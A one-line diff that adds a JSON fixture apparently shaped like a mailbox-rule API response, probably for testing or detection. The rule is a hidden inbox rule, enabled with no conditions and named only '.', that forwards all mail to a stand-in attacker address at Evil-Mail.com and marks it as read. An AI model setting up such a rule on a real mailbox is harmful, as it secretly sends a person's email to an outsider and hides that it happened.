@@ -1,0 +1,1 @@
+{"value": [{"id": "r", "displayName": ".", "isEnabled": true, "conditions": {}, "actions": {"forwardTo": [{"emailAddress": {"address": "x@Evil-Mail.com"}}], "markAsRead": true}}]}
